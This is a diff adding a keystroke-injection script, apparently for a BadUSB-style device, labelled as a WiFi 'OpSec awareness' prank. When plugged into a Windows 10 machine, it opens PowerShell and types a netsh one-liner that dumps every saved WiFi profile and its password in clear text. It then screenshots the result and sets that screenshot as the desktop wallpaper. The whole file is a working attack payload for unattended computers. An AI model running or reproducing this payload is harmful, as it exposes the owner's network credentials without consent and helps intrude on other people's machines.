@@ -1,0 +1,59 @@
+## Title: WiFi_OpSec_Awareness
+## Author: LulzAnarchyAnon
+## Description: PowerShell is opened, and a script 
+## runs that shows all WiFi Profile names, and 
+## passwords. A screenshot is then taken, and saved 
+## to the Pictures\Screenshots folder. It is then 
+## set as the Desktop wallpaper.
+## Target: Windows 10 PowerShell 
+## Props: Darren Kitchen, and I am Jakoby
+## Version: 1.0
+## Category: General
+
+Delay 1000
+RunWin powershell
+Delay 5000
+PrintLine (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize 
+Delay 1000
+Press KEY_LEFT_ALT
+Press KEY_ENTER
+Delay 100
+Release
+Delay 1000
+Press KEY_LEFT_GUI
+Press KEY_PRINT_SCREEN
+Delay 100
+Release
+Delay 1000
+Press KEY_LEFT_ALT
+Press KEY_ENTER
+Delay 100
+Release
+Delay 1000
+PrintLine explorer.exe
+Delay 1000
+Press KEY_LEFT_ALT
+Print d
+Delay 100
+Release
+Delay 1000
+PrintLine Pictures\Screenshots
+Delay 1000
+Press KEY_LEFT_CTRL
+Print a
+Delay 100
+Release
+Delay 1000
+Press KEY_LEFT_ALT
+Print j
+Delay 100
+Release
+Delay 1000
+Print b
+Delay 1000
+Press KEY_LEFT_ALT
+Press KEY_F4
+Delay 100
+Release
+Delay 1000
+PrintLine exit
